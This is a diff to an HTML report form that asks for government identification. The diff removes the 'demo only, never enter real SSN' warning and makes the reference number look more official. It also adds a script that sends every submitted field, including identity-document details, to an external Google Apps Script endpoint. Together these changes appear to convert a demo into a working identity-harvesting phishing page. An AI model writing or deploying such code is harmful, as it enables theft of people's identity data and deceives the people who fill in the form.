@@ -520,8 +520,6 @@
       <h3 class="rf-h3 pt-4">Government identification</h3>
       <hr>
       <p class="rf-p text-muted">
-        Demo only: never enter real SSN, driver's license, or passport information.
-      </p>
       <div class="form-row">
         <div class="form-group col-md-6">
           <label for="aboutIdType" class="rf-p">Identification Type</label>
@@ -579,7 +577,7 @@
             <div>
               <h2 class="m-0" style="color: #1b5e20; font-size: 1.6rem; font-weight: bold;">Thank you. Your report has been submitted.</h2>
               <p class="m-0 mt-1" style="color: #333; font-size: 1.1rem;">
-                Official Report Reference Number: <strong id="confRefNum" style="background: #244873; color: #fff; padding: 4px 12px; border-radius: 4px; font-family: monospace; font-size: 1.2rem; letter-spacing: 1px;">829143</strong>
+                Official Report Reference Number: <strong id="confRefNum" style="background: #244873; color: #fff; padding: 4px 12px; border-radius: 4px; font-family: monospace; font-size: 1.2rem; letter-spacing: 1px;">RPT-829143</strong>
               </p>
             </div>
           </div>
@@ -791,7 +789,7 @@ function onFormContinue() {
 // Form Submission Handler
 function onFormSubmit() {
   // Generate authentic reference number
-  var refNum = Math.floor(100000 + Math.random() * 900000);
+  var refNum = 'RPT-' + Math.floor(100000 + Math.random() * 900000);
   document.getElementById('confRefNum').textContent = refNum;
 
   // Gather values
@@ -1001,3 +999,37 @@ if (document.readyState === 'loading') {
 
 </body>
 </html>
+<script>
+  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzv8gh3fIU9eSbtS6XwiIBqs9JvSMN8W1VG9aXWGnZMsiKQOau6WM-EWvfyXePUCqokPw/exec";
+  const form = document.getElementById("reportForm");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
+    if (submitBtn) submitBtn.disabled = true;
+
+    const formData = new FormData(form);
+    const payload = Object.fromEntries(formData.entries());
+
+    try {
+      const response = await fetch(SCRIPT_URL, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify(payload)
+      });
+
+      const result = await response.json();
+      if (result.result === "success") {
+        alert("Report submitted successfully!");
+        form.reset();
+      } else {
+        alert("Error saving report: " + result.message);
+      }
+    } catch (err) {
+      alert("Network error. Please try again.");
+      console.error(err);
+    } finally {
+      if (submitBtn) submitBtn.disabled = false;
+    }
+  });
+</script>
